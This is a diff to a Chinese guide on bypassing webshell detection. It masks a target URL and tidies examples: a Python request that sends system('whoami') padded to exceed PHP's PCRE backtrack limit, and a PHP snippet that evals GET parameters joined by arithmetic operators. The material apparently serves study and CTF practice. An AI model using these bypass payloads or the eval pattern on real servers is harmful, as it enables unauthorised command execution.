@@ -958,7 +958,7 @@ var_dump(ini_get(‘pcre.backtrack_limit’));
 ```python
 import requests
 
-url = 'http://test.ctf.com/WebShell-Bypass-Guide/test.php'
+url = 'http://***.***.***/WebShell-Bypass-Guide/test.php'
 data = {
     'f': 'system(\'whoami\');//'+'Aabyss'*166667
 }
@@ -1047,7 +1047,7 @@ po[p.er=w_ai_tan_ji
 
 #### 8.9.2 PHP数字可与字符做运算
 
-在PHP中，数字是可以和命令进行一些运算的，比如 `1-phpinfo()` 是可以成功执行phpinfo语句，同样的还有以下运算符：
+在PHP中，数字是可以和命令进行一些运算的，比如 `1-phpinfo()-2` 是可以成功执行phpinfo语句，同样的还有以下运算符：
 
 ```php
 + - * | %
@@ -1056,10 +1056,10 @@ po[p.er=w_ai_tan_ji
 那我们不妨看以下代码：
 
 ```php
-$v1 = (String)$_GET['a'];
-$v2 = (String)$_GET['b'];
-$v3 = (String)$_GET['c'];
-if(is_numeric(a) && is_numeric(c)){
+$a = (String)$_GET['a'];
+$b = (String)$_GET['b'];
+$c = (String)$_GET['c'];
+if(is_numeric($a) && is_numeric($c)){
     echo "$a$b$c = ".$code;
     $code =  eval("return $a$b$c;");
 }
